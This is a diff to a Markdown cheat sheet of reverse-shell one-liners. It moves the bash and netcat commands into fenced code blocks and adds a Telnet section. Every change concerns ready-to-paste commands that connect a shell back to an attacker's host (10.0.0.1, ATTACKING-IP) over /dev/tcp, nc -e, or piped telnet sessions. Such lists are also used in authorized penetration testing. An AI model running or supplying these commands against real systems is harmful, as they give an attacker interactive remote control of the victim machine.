@@ -24,11 +24,12 @@ Each of the methods below is aimed to be a one-liner that you can copy/paste.  A
 # Bash
 
 Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
-
-	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-    
-	exec /bin/bash 0&0 2>&0
-
+~~~
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+~~~
+~~~
+exec /bin/bash 0&0 2>&0
+~~~
 # PERL
 
 Here’s a shorter, feature-free version of the   perl-reverse-shell:
@@ -60,7 +61,9 @@ If you want a .php file to upload, see the more featureful and robust php-revers
 
 Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
 
-	nc -e /bin/sh 10.0.0.1 1234
+~~~
+nc -e /bin/sh 10.0.0.1 1234
+~~~
 
 If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
 
@@ -73,6 +76,15 @@ If you have the wrong version of netcat installed, Jeff Price points out here th
 	p.waitFor()
 
 [Untested submission from anonymous reader]
+
+# Telnet 
+
+
+	rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+
+	telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+
+Remember to listen on 443 on the attacking machine also.
 
 # xterm
 
